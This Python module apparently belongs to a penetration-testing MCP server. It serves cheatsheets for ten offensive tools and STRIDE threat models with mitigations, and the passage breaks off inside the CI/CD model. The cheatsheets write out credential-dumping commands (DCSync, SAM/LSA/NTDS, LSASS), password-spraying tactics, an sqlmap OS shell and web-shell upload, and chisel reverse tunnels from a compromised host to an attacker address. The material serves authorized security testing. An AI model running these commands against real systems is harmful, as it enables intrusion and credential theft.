"""Offensive tools — cheatsheets and threat models."""

from typing import cast

from rick_mcp.constants import CALLSIGN
from rick_mcp.formatting import _fmt, _safe_tool, _sanitize
from rick_mcp.models import (
    CheatsheetInput,
    ThreatModelInput,
)
from rick_mcp.philosophy import (
    chain_validation,
    filters_for_stride,
    principle_anchors,
)
from rick_mcp.tools.writeups import cite_writeups


async def rick_cheatsheet(params: CheatsheetInput) -> str:
    """Quick reference field manual for 10 core offensive tools. The commands you need in the heat of engagement."""
    sheets = {
        "nmap": {
            "tool": "Nmap — Network Mapper",
            "essential_scans": {
                "quick_discovery": "nmap -sn 10.10.10.0/24  # Ping sweep, host discovery",
                "full_tcp": "nmap -sS -sV -sC -p- -oA full_tcp TARGET  # Full TCP, service detection, default scripts",
                "top_udp": "nmap -sU --top-ports 100 -oA top_udp TARGET  # Top 100 UDP ports",
                "aggressive": "nmap -A -T4 -p- TARGET  # OS detection, version, scripts, traceroute",
                "stealth": "nmap -sS -T2 -f --data-length 24 TARGET  # Fragmented, slow, padded",
                "vuln_scan": "nmap --script vuln -p- TARGET  # Run all vuln scripts",
            },
            "useful_scripts": [
                "nmap --script smb-enum-shares,smb-enum-users TARGET  # SMB enum",
                "nmap --script http-enum,http-title,http-methods TARGET  # Web enum",
                "nmap --script ssl-enum-ciphers -p 443 TARGET  # TLS audit",
                "nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=DOMAIN -p 53 TARGET",
                "nmap -sV --script=banner -p- TARGET  # Banner grabbing",
            ],
            "output_formats": "Always use -oA for all formats (.nmap, .xml, .gnmap). Parse XML with nmap-parse-output or grep .gnmap.",
            "rick_note": "Full port scan (-p-) EVERY TIME. I've found critical vulns on port 50000+ more times than I can count. -sS -sV -sC -p- is the bread and butter.",
        },
        "burp": {
            "tool": "Burp Suite Professional — Web Proxy",
            "workflow": {
                "1_proxy_setup": "Set browser proxy to 127.0.0.1:8080. Install Burp CA cert. Use FoxyProxy for easy switching.",
                "2_scope": "Set target scope FIRST. Right-click > Add to scope. Show only in-scope items in Proxy history.",
                "3_crawl": "Target > Site map > right-click > Scan (crawl only first, then audit). Let it map the app.",
                "4_manual": "Walk the app manually. Click everything. Fill every form. Trigger every function. Watch Proxy history.",
                "5_repeater": "Send interesting requests to Repeater (Ctrl+R). Test parameters. Fuzz. Modify. Iterate.",
                "6_intruder": "For systematic fuzzing: Intruder > Sniper/Battering Ram/Pitchfork. SecLists payloads.",
            },
            "key_extensions": [
                "Authorize — automatic IDOR/access control testing across user roles",
                "Logger++ — enhanced logging with regex filtering",
                "Param Miner — hidden parameter discovery",
                "JWT Editor — JWT manipulation, algorithm confusion, key injection",
                "Hackvertor — encoding/decoding/payload transformation",
                "Active Scan++ — enhanced active scanning",
            ],
            "shortcuts": {
                "send_to_repeater": "Ctrl+R",
                "send_to_intruder": "Ctrl+I",
                "forward_intercept": "Ctrl+F",
                "toggle_intercept": "Ctrl+T (in Proxy tab)",
                "url_encode": "Ctrl+U (in Repeater/Intruder)",
            },
            "rick_note": "Burp is home base. The Authorize extension is the single most valuable plugin — it catches IDOR/BOLA that you'd miss manually. Always run it. Always set scope first. And ALWAYS walk the app manually before scanning.",
        },
        "ffuf": {
            "tool": "ffuf — Fuzz Faster U Fool",
            "common_usage": {
                "dir_discovery": "ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403",
                "file_discovery": "ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt",
                "extension_fuzz": "ffuf -u https://TARGET/FUZZ -w wordlist.txt -e .php,.asp,.aspx,.jsp,.html,.js,.txt,.bak,.old",
                "vhost_discovery": "ffuf -u https://TARGET -H 'Host: FUZZ.target.com' -w subdomains.txt -fs SIZE_OF_DEFAULT",
                "parameter_fuzz": "ffuf -u https://TARGET/page?FUZZ=value -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs SIZE",
                "post_data_fuzz": "ffuf -u https://TARGET/login -X POST -d 'user=admin&pass=FUZZ' -w passwords.txt -fc 401",
                "recursive": "ffuf -u https://TARGET/FUZZ -w wordlist.txt -recursion -recursion-depth 2",
            },
            "filters": {
                "by_status": "-mc 200,301 (match codes) or -fc 404,403 (filter codes)",
                "by_size": "-fs 1234 (filter size) or -ms 5000 (match size)",
                "by_words": "-fw 42 (filter word count) or -mw 100 (match word count)",
                "by_lines": "-fl 10 (filter line count)",
                "by_regex": "-fr 'not found' (filter regex in response)",
            },
            "pro_tips": [
                "Use -fs to filter default response size (run one request first to get it)",
                "Rate limit with -rate 100 to avoid lockouts/WAF blocks",
                "Output to file: -o results.json -of json",
                "Multiple wordlists: -w wordlist1.txt:FUZZ1 -w wordlist2.txt:FUZZ2",
                "Use -H 'Cookie: session=xxx' for authenticated fuzzing",
            ],
            "rick_note": "ffuf over Gobuster every time — it's faster and more flexible. The -fs filter is your best friend. Always check for .bak, .old, .swp files — developers leave gold in backup files.",
        },
        "hashcat": {
            "tool": "Hashcat — Advanced Password Recovery",
            "common_modes": {
                "ntlm": "-m 1000  # Windows NTLM hashes",
                "ntlmv2": "-m 5600  # NTLMv2 (Responder captures)",
                "kerberoast": "-m 13100  # Kerberos TGS-REP (Kerberoasting)",
                "asrep": "-m 18200  # Kerberos AS-REP (AS-REP Roasting)",
                "md5": "-m 0  # MD5",
                "sha1": "-m 100  # SHA1",
                "sha256": "-m 1400  # SHA256",
                "sha512": "-m 1800  # SHA512 Unix ($6$)",
                "bcrypt": "-m 3200  # bcrypt ($2*$)",
                "mssql": "-m 1731  # MSSQL 2012+",
                "mysql": "-m 300  # MySQL4.1/5+",
                "wpa2": "-m 22000  # WPA-PBKDF2-PMKID+EAPOL",
            },
            "attack_modes": {
                "dictionary": "hashcat -m MODE hash.txt wordlist.txt",
                "dictionary_rules": "hashcat -m MODE hash.txt wordlist.txt -r OneRuleToRuleThemAll.rule",
                "combinator": "hashcat -m MODE hash.txt -a 1 wordlist1.txt wordlist2.txt",
                "brute_force": "hashcat -m MODE hash.txt -a 3 ?a?a?a?a?a?a?a?a  # 8-char all charset",
                "mask_attack": "hashcat -m MODE hash.txt -a 3 ?u?l?l?l?l?l?d?d  # Pattern: Abcdef12",
                "hybrid": "hashcat -m MODE hash.txt -a 6 wordlist.txt ?d?d?d  # word + 3 digits",
            },
            "charsets": "?l=lowercase ?u=uppercase ?d=digit ?s=special ?a=all ?b=binary. Custom: -1 ?l?d (custom charset 1)",
            "pro_tips": [
                "Always try: rockyou.txt + OneRuleToRuleThemAll.rule first",
                "Potfile: hashcat stores cracked hashes in ~/.hashcat/hashcat.potfile",
                "--show: display already cracked hashes",
                "--username: if hash file has username:hash format",
                "-O: optimized kernels (faster but max 32 char passwords)",
                "Identify unknown hashes: hashid or haiti",
            ],
            "rick_note": "OneRuleToRuleThemAll + rockyou.txt cracks 70%+ of passwords in most environments. For Kerberoasting, always try rules before brute force — service account passwords are often just complex enough to resist straight dictionary but fall to rules.",
        },
        "bloodhound": {
            "tool": "BloodHound — AD Attack Path Mapper",
            "collection": {
                "sharphound_all": "SharpHound.exe -c All --zipfilename bloodhound.zip",
                "sharphound_stealth": "SharpHound.exe -c DCOnly --stealth",
                "bloodhound_py": "bloodhound-python -u USER -p PASS -d DOMAIN -dc DC_FQDN -c All",
                "from_linux": "bloodhound-python -u USER -p PASS -d DOMAIN -ns DC_IP -c All",
            },
            "key_queries": [
                "Find all Domain Admins",
                "Shortest Paths to Domain Admin from Owned Principals",
                "Find Principals with DCSync Rights",
                "Find computers where Domain Users are local admin",
                "Find Kerberoastable Accounts with most privileges",
                "Find AS-REP Roastable Users",
                "Shortest Paths to High Value Targets",
                "Find all computers with Unconstrained Delegation",
            ],
            "cusrick_cypher": {
                "kerberoastable_with_path": "MATCH (u:User {hasspn:true}) MATCH p=shortestPath((u)-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.COM'})) RETURN p",
                "users_with_dcsync": "MATCH p=(u)-[:MemberOf|GetChanges|GetChangesAll*1..]->(d:Domain) RETURN p",
                "computers_no_laps": "MATCH (c:Computer {haslaps:false}) RETURN c.name",
            },
            "workflow": [
                "1. Collect with SharpHound/bloodhound-python",
                "2. Import ZIP into BloodHound GUI",
                "3. Mark owned principals (right-click > Mark as Owned)",
                "4. Run 'Shortest Paths from Owned' queries",
                "5. Identify attack path — each edge is a technique",
                "6. Execute the path: abuse each relationship",
                "7. Mark newly owned principals, repeat",
            ],
            "rick_note": "BloodHound FIRST, always. Before you touch anything else in AD, run collection and map the paths. The graph doesn't lie. Mark your starting position, find the shortest path to DA, and walk it. Every edge in the graph is a technique — learn them all.",
        },
        "impacket": {
            "tool": "Impacket — Python Network Protocol Library",
            "authentication_formats": {
                "password": "DOMAIN/user:password@target",
                "ntlm_hash": "DOMAIN/user@target -hashes LM:NT",
                "kerberos": "DOMAIN/user@target -k -no-pass (with valid ccache)",
            },
            "key_tools": {
                "secretsdump": "impacket-secretsdump DOMAIN/user:pass@DC  # DCSync, SAM dump, LSA secrets",
                "psexec": "impacket-psexec DOMAIN/user:pass@target  # Interactive shell via service",
                "wmiexec": "impacket-wmiexec DOMAIN/user:pass@target  # Semi-interactive via WMI",
                "smbexec": "impacket-smbexec DOMAIN/user:pass@target  # Shell via SMB service",
                "atexec": "impacket-atexec DOMAIN/user:pass@target 'command'  # Execute via scheduled task",
                "dcomexec": "impacket-dcomexec DOMAIN/user:pass@target  # Shell via DCOM",
                "ntlmrelayx": "impacket-ntlmrelayx -t TARGET -smb2support  # NTLM relay attack",
                "getST": "impacket-getST -spn cifs/target DOMAIN/user:pass -impersonate admin  # S4U2Self/S4U2Proxy",
                "getTGT": "impacket-getTGT DOMAIN/user:pass  # Request TGT, save to ccache",
                "GetNPUsers": "impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass  # AS-REP Roast",
                "GetUserSPNs": "impacket-GetUserSPNs DOMAIN/user:pass -request  # Kerberoast",
                "smbclient": "impacket-smbclient DOMAIN/user:pass@target  # Interactive SMB client",
            },
            "pro_tips": [
                "secretsdump with -just-dc-ntlm for just NTLM hashes (faster)",
                "Use -k flag with KRB5CCNAME env var for Kerberos auth",
                "ntlmrelayx -socks for persistent SOCKS proxy through relayed sessions",
                "getST for constrained delegation abuse (S4U2Proxy)",
                "mssqlclient.py for MSSQL interaction with Impacket auth",
            ],
            "rick_note": "Impacket is the Swiss Army knife of AD pentesting. secretsdump is the endgame tool — DCSync everything. ntlmrelayx with -socks is incredibly powerful for maintaining access through relayed sessions. Learn every tool in the suite.",
        },
        "crackmapexec": {
            "tool": "CrackMapExec (CME/NetExec) — Swiss Army Knife for Networks",
            "protocols": "smb, ldap, winrm, mssql, ssh, rdp, ftp",
            "essential_commands": {
                "smb_spray": "cme smb SUBNET/24 -u user -p password  # Password spray across subnet",
                "smb_pth": "cme smb TARGET -u user -H NTHASH  # Pass-the-Hash",
                "enum_shares": "cme smb TARGET -u user -p pass --shares  # Enumerate shares",
                "enum_users": "cme smb TARGET -u user -p pass --users  # Enumerate domain users",
                "enum_sessions": "cme smb TARGET -u user -p pass --sessions  # Active sessions",
                "enum_logged_on": "cme smb TARGET -u user -p pass --loggedon-users  # Logged on users",
                "sam_dump": "cme smb TARGET -u admin -p pass --sam  # Dump local SAM",
                "lsa_dump": "cme smb TARGET -u admin -p pass --lsa  # Dump LSA secrets",
                "ntds_dump": "cme smb DC -u DA -p pass --ntds  # Dump NTDS.dit (domain hashes)",
                "command_exec": "cme smb TARGET -u admin -p pass -x 'whoami'  # Execute command",
                "ps_exec": "cme smb TARGET -u admin -p pass -X 'Get-Process'  # PowerShell exec",
                "winrm_exec": "cme winrm TARGET -u user -p pass -x 'whoami'  # WinRM command",
                "mssql_exec": "cme mssql TARGET -u sa -p pass -x 'whoami'  # MSSQL xp_cmdshell",
            },
            "modules": [
                "cme smb TARGET -u user -p pass -M spider_plus  # Spider shares for files",
                "cme smb TARGET -u user -p pass -M lsassy  # Remote LSASS dump",
                "cme smb TARGET -u user -p pass -M gpp_password  # Find GPP passwords",
                "cme smb TARGET -u user -p pass -M webdav  # Check WebDAV",
                "cme ldap TARGET -u user -p pass -M get-desc-users  # Users with passwords in description",
            ],
            "rick_note": "CME is the lateral movement workhorse. Spray a subnet, find local admin, dump SAM, move on. The spider_plus module finds sensitive files on shares. lsassy module for remote credential dumping without touching disk. Beautiful tool.",
        },
        "chisel": {
            "tool": "Chisel — TCP/UDP Tunneling over HTTP",
            "setup": {
                "server_reverse": "# On your attack machine:\nchisel server -p 8080 --reverse",
                "client_socks": "# On compromised host:\nchisel client YOUR_IP:8080 R:socks\n# Creates SOCKS5 proxy on attacker port 1080",
                "client_portfwd": "# Forward specific port:\nchisel client YOUR_IP:8080 R:8445:INTERNAL_TARGET:445\n# Access internal SMB on your localhost:8445",
                "client_multi": "# Multiple forwards:\nchisel client YOUR_IP:8080 R:socks R:3389:DC:3389 R:1433:SQLSRV:1433",
            },
            "usage_with_tools": {
                "proxychains": "# /etc/proxychains4.conf: socks5 127.0.0.1 1080\nproxychains nmap -sT -Pn INTERNAL_TARGET\nproxychains cme smb INTERNAL_SUBNET/24 -u user -p pass",
                "firefox": "Network Settings > Manual proxy > SOCKS Host 127.0.0.1 Port 1080",
                "burp_upstream": "User Options > Connections > SOCKS proxy > 127.0.0.1:1080",
                "evil_winrm": "proxychains evil-winrm -i INTERNAL_TARGET -u user -p pass",
                "rdp": "proxychains xfreerdp /v:INTERNAL_TARGET /u:user /p:pass",
            },
            "alternatives": {
                "ligolo_ng": "Faster, TUN interface (no proxychains needed). Better for large-scale pivoting.",
                "ssh_dynamic": "ssh -D 9050 user@pivot — if SSH access available.",
                "socat": "socat TCP-LISTEN:LOCAL,fork TCP:REMOTE:PORT — simple port forward.",
            },
            "rick_note": "Chisel is the go-to for HTTP tunneling when SSH isn't available. Reverse SOCKS is the move — one tunnel, access everything internal through proxychains. For bigger engagements, Ligolo-ng with its TUN interface is cleaner. The tunnel is the bridge between your position and the target — build it solid.",
        },
        "sqlmap": {
            "tool": "SQLMap — Automated SQL Injection",
            "basic_usage": {
                "get_param": "sqlmap -u 'https://TARGET/page?id=1' --batch",
                "post_param": "sqlmap -u 'https://TARGET/login' --data 'user=admin&pass=test' -p pass --batch",
                "cookie_inject": "sqlmap -u 'https://TARGET/page' --cookie='id=1*' --batch",
                "header_inject": "sqlmap -u 'https://TARGET/page' --headers='X-Forwarded-For: 1*' --batch",
                "from_burp": "sqlmap -r request.txt --batch  # Save request from Burp > Copy to file",
            },
            "enumeration": {
                "databases": "sqlmap -r req.txt --dbs",
                "tables": "sqlmap -r req.txt -D database_name --tables",
                "columns": "sqlmap -r req.txt -D database_name -T table_name --columns",
                "dump": "sqlmap -r req.txt -D database_name -T table_name --dump",
                "current_user": "sqlmap -r req.txt --current-user",
                "is_dba": "sqlmap -r req.txt --is-dba",
                "passwords": "sqlmap -r req.txt --passwords",
            },
            "exploitation": {
                "os_shell": "sqlmap -r req.txt --os-shell  # Interactive OS command shell",
                "os_cmd": "sqlmap -r req.txt --os-cmd='whoami'  # Single OS command",
                "file_read": "sqlmap -r req.txt --file-read='/etc/passwd'",
                "file_write": "sqlmap -r req.txt --file-write='shell.php' --file-dest='/var/www/html/shell.php'",
                "sql_shell": "sqlmap -r req.txt --sql-shell  # Interactive SQL prompt",
            },
            "pro_tips": [
                "--risk 3 --level 5 for thorough testing (slower, more payloads)",
                "--technique=BT for blind + time-based only (stealthier)",
                "--tamper=space2comment,randomcase for basic WAF bypass",
                "--proxy=http://127.0.0.1:8080 to route through Burp",
                "--second-url for second-order SQLi",
                "--threads 10 for faster exploitation (be careful with time-based)",
                "--forms to auto-detect and test form parameters",
            ],
            "rick_note": "Always try manual injection in Burp first. SQLMap is the automation layer after you've confirmed the vuln exists. Save the request from Burp (-r flag) — it handles cookies, headers, tokens automatically. --os-shell is the money shot when you're DBA.",
        },
        "kerbrute": {
            "tool": "Kerbrute — Kerberos Pre-Auth Brute Forcer",
            "usage": {
                "user_enum": "kerbrute userenum -d DOMAIN --dc DC_IP userlist.txt  # Enumerate valid users without lockout",
                "password_spray": "kerbrute passwordspray -d DOMAIN --dc DC_IP userlist.txt 'Password123!'  # Spray single password",
                "brute_force": "kerbrute bruteuser -d DOMAIN --dc DC_IP passwords.txt username  # Brute single user",
            },
            "why_kerbrute": [
                "Kerberos pre-auth doesn't trigger traditional logon failure events (4625)",
                "Faster than LDAP/SMB-based spraying",
                "Only generates 4768 events (TGT requests) — often not monitored",
                "Valid user enumeration without any valid credentials",
                "No account lockout risk for user enumeration (invalid users get different error)",
            ],
            "user_lists": [
                "Generate from LinkedIn: first.last, f.last, firstl formats",
                "SecLists/Usernames/Names/names.txt for common first names",
                "statistically-likely-usernames on GitHub for format-specific lists",
                "Combine with company-specific patterns (jsmith, john.smith, smithj)",
            ],
            "spray_strategy": [
                "1. Enumerate valid users first (userenum)",
                "2. Check domain password policy (net accounts /domain or LDAP)",
                "3. Spray ONE password across all users",
                "4. Wait for lockout window (usually 30 min)",
                "5. Spray next password",
                "6. Common sprays: Season+Year (Spring2024!), Company+123, Welcome1!",
            ],
            "rick_note": "Kerbrute for user enumeration is pure gold — no creds needed, no lockouts, minimal logging. For spraying, ALWAYS check the lockout policy first. Season+Year! is the most common password pattern in corporate environments. One spray, then wait.",
        },
    }
    t = params.tool.lower().strip()
    sheet = sheets.get(t)
    if not sheet:
        return f"Error: Unknown tool '{t}'. Available: {', '.join(sheets.keys())}"
    sheet["authorization"] = "AUTHORIZED ENGAGEMENTS ONLY"
    cites = cite_writeups(t)
    if cites:
        sheet["seen_in_writeups"] = cites
    return _fmt(sheet, params.response_format, title=f"{CALLSIGN} Field Manual")


async def rick_threat_model(params: ThreatModelInput) -> str:
    """STRIDE-based threat modeling by system type. Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation of Privilege."""
    models = {
        "web_app": {
            "system": "Web Application",
            "trust_boundaries": [
                "Browser ↔ Web Server",
                "Web Server ↔ Database",
                "Web Server ↔ Auth Provider",
                "Web Server ↔ Third-Party APIs",
                "CDN ↔ Origin",
            ],
            "stride": {
                "spoofing": {
                    "threats": [
                        "Session hijacking",
                        "Credential stuffing",
                        "Cookie theft",
                        "JWT forgery",
                        "OAuth token theft",
                    ],
                    "mitigations": [
                        "MFA",
                        "Secure session management (HttpOnly, Secure, SameSite)",
                        "CSRF tokens",
                        "JWT validation with strong keys",
                        "Short-lived tokens",
                    ],
                },
                "tampering": {
                    "threats": [
                        "SQL injection",
                        "XSS payload injection",
                        "Parameter tampering",
                        "Request body manipulation",
                        "Cache poisoning",
                    ],
                    "mitigations": [
                        "Parameterized queries",
                        "Input validation + output encoding",
                        "Server-side validation",
                        "HMAC on critical params",
                        "Cache-Control headers",
                    ],
                },
                "repudiation": {
                    "threats": ["Missing audit logs", "Log injection", "Timestamp manipulation", "Anonymous actions"],
                    "mitigations": [
                        "Comprehensive audit logging",
                        "Log integrity protection",
                        "NTP sync",
                        "Require authentication for state changes",
                    ],
                },
                "information_disclosure": {
                    "threats": [
                        "Verbose errors/stack traces",
                        "Directory listing",
                        "Source code exposure",
                        "Hardcoded secrets in JS",
                        "IDOR exposing other users' data",
                    ],
                    "mitigations": [
                        "Custom error pages",
                        "Disable directory listing",
                        "Server-side rendering for sensitive data",
                        "Secrets management",
                        "Authorization on every resource",
                    ],
                },
                "denial_of_service": {
                    "threats": [
                        "Application-layer DoS",
                        "ReDoS",
                        "Resource exhaustion",
                        "File upload abuse",
                        "API rate limit bypass",
                    ],
                    "mitigations": [
                        "Rate limiting",
                        "WAF",
                        "Input length limits",
                        "File size/type restrictions",
                        "Queue-based processing",
                    ],
                },
                "elevation_of_privilege": {
                    "threats": [
                        "IDOR/BOLA",
                        "Mass assignment",
                        "JWT claim manipulation",
                        "Role parameter tampering",
                        "Path traversal to admin",
                    ],
                    "mitigations": [
                        "Server-side authorization on every request",
                        "Whitelist allowed fields",
                        "JWT signature verification",
                        "RBAC enforcement",
                        "Principle of least privilege",
                    ],
                },
            },
            "rick_note": "Trust boundaries are where vulns live. Focus on browser-to-server and server-to-database boundaries first. Every data flow crossing a boundary needs validation.",
        },
        "api": {
            "system": "API (REST/GraphQL)",
            "trust_boundaries": [
                "Client ↔ API Gateway",
                "API Gateway ↔ Microservices",
                "Service ↔ Database",
                "Service ↔ Service",
                "API ↔ External APIs",
            ],
            "stride": {
                "spoofing": {
                    "threats": [
                        "API key theft",
                        "JWT algorithm confusion",
                        "OAuth redirect manipulation",
                        "Stolen bearer tokens",
                        "Service-to-service impersonation",
                    ],
                    "mitigations": [
                        "Short-lived tokens with refresh",
                        "Strong JWT validation (RS256+)",
                        "Strict redirect URI validation",
                        "mTLS for service-to-service",
                        "API key rotation",
                    ],
                },
                "tampering": {
                    "threats": [
                        "Mass assignment",
                        "GraphQL injection",
                        "Request body manipulation",
                        "Batch operation abuse",
                        "Content-Type confusion",
                    ],
                    "mitigations": [
                        "Explicit field whitelisting",
                        "Query depth/complexity limits",
                        "Schema validation",
                        "Request signing",
                        "Strict Content-Type enforcement",
                    ],
                },
                "repudiation": {
                    "threats": [
                        "Missing request logging",
                        "No correlation IDs",
                        "Unsigned webhooks",
                        "Anonymous API access",
                    ],
                    "mitigations": [
                        "Structured request/response logging",
                        "Correlation ID propagation",
                        "Webhook signature verification",
                        "Authentication required",
                    ],
                },
                "information_disclosure": {
                    "threats": [
                        "Excessive data exposure",
                        "GraphQL introspection in prod",
                        "Verbose errors with internals",
                        "API version info leakage",
                        "Broken object-level auth",
                    ],
                    "mitigations": [
                        "Response field filtering",
                        "Disable introspection in prod",
                        "Generic error responses",
                        "Remove version headers",
                        "BOLA checks on every endpoint",
                    ],
                },
                "denial_of_service": {
                    "threats": [
                        "GraphQL query bombing",
                        "Pagination abuse",
                        "Large payload attacks",
                        "Recursive query depth",
                        "Resource-intensive operations",
                    ],
                    "mitigations": [
                        "Query complexity analysis",
                        "Cursor-based pagination with limits",
                        "Request size limits",
                        "Depth limiting",
                        "Async processing for heavy ops",
                    ],
                },
                "elevation_of_privilege": {
                    "threats": [
                        "BOLA/IDOR across resources",
                        "Function-level access control bypass",
                        "Horizontal privilege escalation",
                        "Admin endpoint discovery",
                        "Broken object property level auth",
                    ],
                    "mitigations": [
                        "Authorization middleware on every endpoint",
                        "RBAC/ABAC enforcement",
                        "User context validation",
                        "Admin endpoints on separate network",
                        "Field-level access control",
                    ],
                },
            },
            "rick_note": "BOLA is API threat #1. Model every endpoint with the question: 'Can user A access user B's data?' GraphQL introspection in prod = handing attackers the map.",
        },
        "microservices": {
            "system": "Microservices Architecture",
            "trust_boundaries": [
                "External ↔ API Gateway",
                "Gateway ↔ Services",
                "Service ↔ Service",
                "Service ↔ Data Store",
                "Service ↔ Message Queue",
                "Service ↔ Secrets Manager",
            ],
            "stride": {
                "spoofing": {
                    "threats": [
                        "Service impersonation on internal network",
                        "Stolen service credentials",
                        "Man-in-the-middle between services",
                        "Rogue container deployment",
                    ],
                    "mitigations": [
                        "mTLS between all services (service mesh)",
                        "Workload identity (SPIFFE/SPIRE)",
                        "Network policies restricting service communication",
                        "Image signing and verification",
                    ],
                },
                "tampering": {
                    "threats": [
                        "Message queue poisoning",
                        "Shared database corruption",
                        "Config injection via environment",
                        "Supply chain compromise of base images",
                    ],
                    "mitigations": [
                        "Message signing/validation",
                        "Database per service pattern",
                        "Sealed secrets",
                        "Image scanning and SBOM",
                    ],
                },
                "repudiation": {
                    "threats": [
                        "Distributed tracing gaps",
                        "Inconsistent logging across services",
                        "Lost messages in async flows",
                        "No audit trail for service-to-service calls",
                    ],
                    "mitigations": [
                        "Centralized logging (ELK/Loki)",
                        "Distributed tracing (Jaeger/Zipkin)",
                        "Dead letter queues with monitoring",
                        "Request correlation IDs",
                    ],
                },
                "information_disclosure": {
                    "threats": [
                        "Secrets in environment variables",
                        "Service discovery metadata leakage",
                        "Debug endpoints exposed",
                        "Container logs with sensitive data",
                    ],
                    "mitigations": [
                        "External secrets manager (Vault)",
                        "Network policies limiting discovery",
                        "Remove debug endpoints in prod",
                        "Structured logging with PII redaction",
                    ],
                },
                "denial_of_service": {
                    "threats": [
                        "Cascading failures",
                        "Resource starvation from noisy neighbor",
                        "Message queue flooding",
                        "Connection pool exhaustion",
                    ],
                    "mitigations": [
                        "Circuit breakers (Hystrix/Resilience4j)",
                        "Resource limits per service",
                        "Queue backpressure and rate limiting",
                        "Connection pooling with limits",
                    ],
                },
                "elevation_of_privilege": {
                    "threats": [
                        "Overpermissioned service accounts",
                        "Container escape to host",
                        "Shared namespace access",
                        "Kubernetes RBAC bypass",
                    ],
                    "mitigations": [
                        "Least privilege service accounts",
                        "Non-root containers, read-only filesystem",
                        "Namespace isolation with network policies",
                        "Regular RBAC audit",
                    ],
                },
            },
            "rick_note": "In microservices, the network IS the attack surface. mTLS everywhere. Network policies default deny. Every service boundary is a trust boundary. Build it like a submarine — compartmentalized so one breach doesn't sink the ship.",
        },
        "mobile_app": {
            "system": "Mobile Application",
            "trust_boundaries": [
                "Device ↔ API",
                "App ↔ Local Storage",
                "App ↔ OS Services",
                "App ↔ Third-Party SDKs",
                "App ↔ Push Notifications",
            ],
            "stride": {
                "spoofing": {
                    "threats": [
                        "Certificate pinning bypass",
                        "Biometric bypass",
                        "Deep link hijacking",
                        "Fake app distribution",
                    ],
                    "mitigations": [
                        "Certificate pinning with backup keys",
                        "Server-side biometric validation",
                        "App Links / Universal Links verification",
                        "App store only distribution",
                    ],
                },
                "tampering": {
                    "threats": [
                        "Runtime hooking (Frida)",
                        "Binary patching",
                        "Root/jailbreak exploitation",
                        "Shared preference modification",
                    ],
                    "mitigations": [
                        "Root/jailbreak detection",
                        "Integrity checks",
                        "Obfuscation (ProGuard/R8)",
                        "Encrypted local storage",
                    ],
                },
                "repudiation": {
                    "threats": ["Client-side only logging", "Offline action replay", "Transaction manipulation"],
                    "mitigations": [
                        "Server-side logging for all critical actions",
                        "Server-side validation of all operations",
                        "Transaction signing",
                    ],
                },
                "information_disclosure": {
                    "threats": [
                        "Plaintext local storage",
                        "Screenshots of sensitive data",
                        "Clipboard data leakage",
                        "Backup extraction",
                        "Hardcoded API keys in binary",
                    ],
                    "mitigations": [
                        "Encrypted storage (Keychain/Keystore)",
                        "Prevent screenshots on sensitive screens",
                        "Clear clipboard on background",
                        "Exclude from backups",
                        "Runtime key retrieval",
                    ],
                },
                "denial_of_service": {
                    "threats": [
                        "Local DoS via malformed input",
                        "Push notification flooding",
                        "Deep link crash vectors",
                    ],
                    "mitigations": [
                        "Input validation",
                        "Rate limit push notifications",
                        "Deep link input sanitization",
                    ],
                },
                "elevation_of_privilege": {
                    "threats": [
                        "Intent hijacking (Android)",
                        "URL scheme hijacking (iOS)",
                        "Privilege escalation via IPC",
                        "WebView JavaScript bridge abuse",
                    ],
                    "mitigations": [
                        "Explicit intents",
                        "Universal Links",
                        "IPC permission enforcement",
                        "Disable JavaScript in WebViews unless required",
                    ],
                },
            },
            "rick_note": "The binary is in the attacker's hands. Assume it will be reverse engineered. Never trust the client. All security decisions happen server-side. Frida + Objection will bypass almost anything client-side.",
        },
        "cloud_infra": {
            "system": "Cloud Infrastructure (AWS/Azure/GCP)",
            "trust_boundaries": [
                "Internet ↔ Cloud Perimeter",
                "Public Subnet ↔ Private Subnet",
                "Account/Subscription ↔ Account/Subscription",
                "Cloud ↔ On-Premises",
                "Control Plane ↔ Data Plane",
            ],
            "stride": {
                "spoofing": {
                    "threats": [
                        "Stolen cloud credentials",
                        "Assumed role abuse",
                        "Metadata service credential theft (IMDS)",
                        "Service principal impersonation",
                    ],
                    "mitigations": [
                        "MFA on all accounts",
                        "Least privilege IAM",
                        "IMDSv2 required",
                        "Managed identities over keys",
                    ],
                },
                "tampering": {
                    "threats": [
                        "S3/Blob policy modification",
                        "Security group rule changes",
                        "IAM policy escalation",
                        "Infrastructure as Code injection",
                    ],
                    "mitigations": [
                        "SCPs/Azure Policy guardrails",
                        "CloudTrail/Activity Log monitoring",
                        "IAM Access Analyzer",
                        "IaC pipeline with approval gates",
                    ],
                },
                "repudiation": {
                    "threats": [
                        "CloudTrail disabled/deleted",
                        "Log gaps in multi-region",
                        "Cross-account activity not tracked",
                    ],
                    "mitigations": [
                        "CloudTrail in all regions with log validation",
                        "Organization trail",
                        "Centralized logging to security account",
                        "Immutable log storage",
                    ],
                },
                "information_disclosure": {
                    "threats": [
                        "Public S3 buckets/blobs",
                        "Exposed snapshots/AMIs",
                        "Secrets in user-data/metadata",
                        "Overpermissioned IAM read access",
                    ],
                    "mitigations": [
                        "Block public access at account level",
                        "Private snapshots only",
                        "Secrets Manager for all secrets",
                        "IAM Access Analyzer",
                    ],
                },
                "denial_of_service": {
                    "threats": [
                        "Resource exhaustion (crypto mining)",
                        "DDoS on public endpoints",
                        "Runaway Lambda/Functions",
                        "Storage/compute quota exhaustion",
                    ],
                    "mitigations": [
                        "Billing alerts",
                        "DDoS protection (Shield/Front Door)",
                        "Concurrency limits",
                        "Quota monitoring and alerts",
                    ],
                },
                "elevation_of_privilege": {
                    "threats": [
                        "IAM privilege escalation paths",
                        "Cross-account role assumption",
                        "Service-linked role abuse",
                        "Resource policy wildcards",
                    ],
                    "mitigations": [
                        "Least privilege with regular review",
                        "Condition keys on AssumeRole",
                        "Audit service-linked roles",
                        "No wildcard resource policies",
                    ],
                },
            },
            "rick_note": "IAM IS the perimeter in cloud. Model every identity (user, role, service principal, managed identity) and what it can access. Resource policies + identity policies = the two sides of every access decision. Miss one and you've got a gap.",
        },
        "ci_cd_pipeline": {
            "system": "CI/CD Pipeline",
            "trust_boundaries": [
                "Developer ↔ VCS",
